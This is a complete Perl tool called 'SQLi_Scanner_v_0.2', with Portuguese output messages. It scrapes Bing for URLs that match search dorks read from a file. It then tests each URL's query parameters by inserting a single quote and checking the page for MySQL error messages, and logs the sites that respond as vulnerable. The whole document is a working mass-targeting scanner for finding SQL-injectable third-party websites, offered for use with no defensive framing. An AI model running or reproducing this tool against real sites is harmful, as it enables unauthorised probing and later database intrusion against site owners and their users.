BEGIN { $ENV{ACTIVEPERL_CONFIG_DISABLE} = 1; }

#perl2exe_exclude "File/BSDGlob.pm"
#perl2exe_exclude "Compress/Bzip2.pm"
#perl2exe_exclude "I18N/Langinfo.pm"
#perl2exe_include "attributes.pm"


use strict;
no warnings;
use threads;
use threads::shared;
use LWP::UserAgent;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);


my $threads = 10;

my $ua = LWP::UserAgent->new;
$ua->timeout(15);
$ua->agent('Mozilla/5.0');

my @dorkz : shared;
my @linkz : shared;

system("cls");
system("color A");
print "++++++++++++++++++++++++++++++++++++++++++++++++\n";
print color("red"),"+             SQLi_Scanner_v_0.2               +\n",color("reset");
print "+                                              +\n";
print "++++++++++++++++++++++++++++++++++++++++++++++++\n";
print "\n[i]Motor de busca: bing.com\n";
print "\[.]Iniciando...\n";
GetDorkz();
print "[i]Quantidade de Dorks: ".scalar(@dorkz)."\n";
GetLinks();
while (threads->list) {}
print "[i]Links encontrados: ".scalar(@linkz)."\n";
print "[.]Começar testes...\n\n";
CheckLinks();
while (threads->list) {}
print "[!]Tudo feito, verificar output_injection.txt\n\n";


sub CheckLinks {
	foreach my $link( @linkz ) {
		my  $ctr = 0;
		foreach my $thr ( threads->list ) { $ctr++; }
		if ($ctr < $threads){
			threads->create( \&InjectionCheck, $link );
		}
		else { redo; }
	}
}

sub GetLinks {
	foreach my $dork( @dorkz ) {
		my  $ctr = 0;
		foreach my $thr ( threads->list ) { $ctr++; }
		if ($ctr < $threads){
			threads->create( \&GetLinks_bing,$dork );
		}
		else { redo; }
	}
}

sub GetDorkz {
	open( DORKZ, "input.txt" ) or die "$!\n";
	while( defined( my $line_ = <DORKZ> ) ) {
		chomp( $line_ );
		push( @dorkz, $line_ );
	}
	close( DORKZ );
}

## BING_SEARCH
## http://www.bing.com/search?q=index.php%3Fid%3D&filt=all&first=1
sub GetLinks_bing {
	my $dork = shift;
	chomp( $dork );
	for( my $i = 1; $i < 960; $i = $i + 50 ) {
		my $url = "http://www.bing.com/search?q=".$dork."&&filt=rf&first=".$i;
		my $content = $ua->get($url)->content;
		while( $content =~ m/<h3><a href="(.+?)"/gi ) {
			my $link = $1;
			$link =~ s/&amp;/&/g;
			#print $link."\n";
			push( @linkz, $link );
		}
	}
	threads->detach();
}

sub InjectionCheck {
	my $link = shift;
	chomp( $link );
	print color("red"),"[-]Não: $link\n",color("reset");
	my $content = $ua->get($link)->content;
	for(my $position = 0; ($position = index($link, "=", $position)) >= 0; $position++) {
		my $linkcpy = $link;
		substr($linkcpy, $position, 1) = "='";   
		my $content2 = $ua->get($linkcpy)->content;
		unless( $content eq $content2 ) {
			if( $content2 =~ m/mysql_fetch_/i || $content2=~ m/You have an error in your SQL syntax/i || $content2 =~ m/tem um erro de sintaxe no seu SQL/i || $content2 =~ m/mysql_num_rows/i || $content2 =~ m/Division by zero in/i ) { 
				print color("green"),"[+]Vulnerável: ".$linkcpy."\n",color("reset");
				Output( $linkcpy );
				threads->detach();
			}
		}
	}
	threads->detach();
}

sub Output {
	my $para = shift;
	open (OUT, '>>output_injection.txt') or die("Não é possível gravar output_injection\n");
	print OUT $para."\n";
	close (OUT);
}